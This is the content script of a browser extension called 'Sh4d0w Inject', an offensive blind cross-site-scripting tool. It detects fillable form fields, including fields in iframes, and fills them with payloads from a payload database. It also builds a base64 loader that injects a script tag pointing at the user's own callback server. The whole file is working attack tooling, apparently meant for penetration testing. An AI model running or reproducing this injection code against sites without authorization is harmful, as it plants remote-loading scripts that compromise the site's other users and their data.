/**
 * Sh4d0w Inject — Content Script (Store Version)
 * On-demand field detection & fill
 * {{SERVER}} replaced at runtime with user's configured server URL
 */

(function () {
    'use strict';

    if (window.__sh4d0w_loaded) return;
    window.__sh4d0w_loaded = true;

    const DB = window.BLINDXSS_PAYLOADS;

    // Server URL injected by background script
    const SERVER_URL = window.__SH4D0W_SERVER || '';

    // Replace {{SERVER}} and {{LOADER_B64}} in any payload string
    function resolvePayload(payload) {
        if (!SERVER_URL) return payload;
        payload = payload.replace(/\{\{SERVER\}\}/g, SERVER_URL);
        // Dynamic base64: generate btoa() of script loader with user's actual server URL
        if (payload.includes('{{LOADER_B64}}')) {
            const loaderCode = 'var a=document.createElement("script");a.src="' + SERVER_URL + '";document.body.appendChild(a);';
            try {
                payload = payload.replace(/\{\{LOADER_B64\}\}/g, btoa(loaderCode));
            } catch (e) { /* btoa failed, leave as-is */ }
        }
        return payload;
    }

    // =============================
    // Field Type Detection
    // =============================
    function classifyField(el) {
        const tag = el.tagName.toLowerCase();
        const type = (el.getAttribute('type') || '').toLowerCase();
        const name = (el.getAttribute('name') || '').toLowerCase();
        const id = (el.getAttribute('id') || '').toLowerCase();
        const placeholder = (el.getAttribute('placeholder') || '').toLowerCase();
        const label = getLabel(el).toLowerCase();
        const ariaLabel = (el.getAttribute('aria-label') || '').toLowerCase();
        const autocomplete = (el.getAttribute('autocomplete') || '').toLowerCase();

        const combined = `${name} ${id} ${placeholder} ${label} ${ariaLabel} ${autocomplete} ${type}`;

        const skipTypes = ['hidden', 'password', 'file', 'submit', 'button', 'reset',
            'image', 'checkbox', 'radio', 'date', 'datetime-local', 'time',
            'month', 'week', 'color', 'range'];
        if (skipTypes.includes(type)) return null;

        if (tag === 'textarea') return 'message';
        if (el.getAttribute('contenteditable') === 'true') return 'message';

        for (const [fieldType, config] of Object.entries(DB.fieldPatterns)) {
            for (const keyword of config.keywords) {
                if (combined.includes(keyword)) return fieldType;
            }
        }

        if (type === 'email') return 'email';
        if (type === 'tel') return 'phone';
        if (type === 'url') return 'url';
        if (type === 'search') return 'search';
        if (type === 'number') return 'phone';
        if (tag === 'select') return null;
        if (tag === 'input') return 'generic';
        return 'generic';
    }

    function getLabel(el) {
        const id = el.getAttribute('id');
        if (id) {
            const label = document.querySelector(`label[for="${CSS.escape(id)}"]`);
            if (label) return label.textContent || '';
        }
        const parentLabel = el.closest('label');
        if (parentLabel) return parentLabel.textContent || '';
        return '';
    }

    // =============================
    // Payload Selection
    // =============================
    function getRandomItem(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    function getPayloadForField(fieldType) {
        const payloads = DB.payloadsByType[fieldType] || DB.payloadsByType.generic;
        return resolvePayload(getRandomItem(payloads));
    }

    // =============================
    // Field Filling
    // =============================
    function fillField(el, payload) {
        el.focus();

        if (el.getAttribute('contenteditable') === 'true') {
            el.innerHTML = payload;
        } else {
            const tag = el.tagName.toLowerCase();
            let nativeSet;

            if (tag === 'textarea') {
                nativeSet = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value')?.set;
            } else {
                nativeSet = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')?.set;
            }

            if (nativeSet) {
                nativeSet.call(el, payload);
            } else {
                el.value = payload;
            }
        }

        el.dispatchEvent(new Event('input', { bubbles: true, cancelable: true }));
        el.dispatchEvent(new Event('change', { bubbles: true, cancelable: true }));
        el.dispatchEvent(new Event('blur', { bubbles: true }));
        el.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, key: 'a', keyCode: 65 }));
        el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: 'a', keyCode: 65 }));
        el.dispatchEvent(new KeyboardEvent('keypress', { bubbles: true, key: 'a', keyCode: 65 }));
    }

    function getAllFillableFields() {
        const fields = [];
        const selector = [
            'input:not([type="hidden"]):not([type="submit"]):not([type="button"])',
            ':not([type="reset"]):not([type="file"]):not([type="image"])',
            ':not([type="checkbox"]):not([type="radio"]):not([type="date"])',
            ':not([type="datetime-local"]):not([type="time"]):not([type="month"])',
            ':not([type="week"]):not([type="color"]):not([type="range"])',
            ':not([type="password"])'
        ].join('');

        document.querySelectorAll(`${selector}, textarea, [contenteditable="true"]`).forEach(el => {
            const rect = el.getBoundingClientRect();
            if (rect.width === 0 && rect.height === 0) return;
            const style = getComputedStyle(el);
            if (style.display === 'none' || style.visibility === 'hidden') return;
            if (el.readOnly || el.disabled) return;

            const fieldType = classifyField(el);
            if (fieldType) fields.push({ element: el, type: fieldType });
        });

        try {
            document.querySelectorAll('iframe').forEach(iframe => {
                try {
                    const doc = iframe.contentDocument || iframe.contentWindow?.document;
                    if (!doc) return;
                    doc.querySelectorAll(`${selector}, textarea`).forEach(el => {
                        const ft = classifyField(el);
                        if (ft) fields.push({ element: el, type: ft });
                    });
                } catch (e) { }
            });
        } catch (e) { }

        return fields;
    }

    // =============================
    // Main Fill Functions
    // =============================
    function fillAllFields() {
        const fields = getAllFillableFields();
        let filledCount = 0;

        fields.forEach((field, index) => {
            setTimeout(() => {
                const payload = getPayloadForField(field.type);
                fillField(field.element, payload);

                field.element.style.transition = 'box-shadow 0.3s ease';
                field.element.style.boxShadow = '0 0 10px 3px rgba(0, 255, 65, 0.6)';
                setTimeout(() => {
                    field.element.style.boxShadow = '';
                    field.element.style.transition = '';
                }, 800);
            }, index * 80);

            filledCount++;
        });

        return { total: fields.length, filled: filledCount };
    }

    function fillSingleField(el) {
        const fieldType = classifyField(el);
        if (!fieldType) return false;

        const payload = getPayloadForField(fieldType);
        fillField(el, payload);

        el.style.transition = 'box-shadow 0.3s ease';
        el.style.boxShadow = '0 0 10px 3px rgba(0, 255, 65, 0.6)';
        setTimeout(() => {
            el.style.boxShadow = '';
            el.style.transition = '';
        }, 800);

        return true;
    }

    function countFields() {
        const fields = getAllFillableFields();
        const counts = {};
        fields.forEach(f => { counts[f.type] = (counts[f.type] || 0) + 1; });
        return { total: fields.length, byType: counts };
    }

    // =============================
    // Message Listener
    // =============================
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
        if (message.action === 'fillAll') {
            sendResponse(fillAllFields());
            return true;
        }
        if (message.action === 'fillField') {
            const el = document.activeElement;
            sendResponse({ success: el ? fillSingleField(el) : false });
            return true;
        }
        if (message.action === 'countFields') {
            sendResponse(countFields());
            return true;
        }
    });

})();
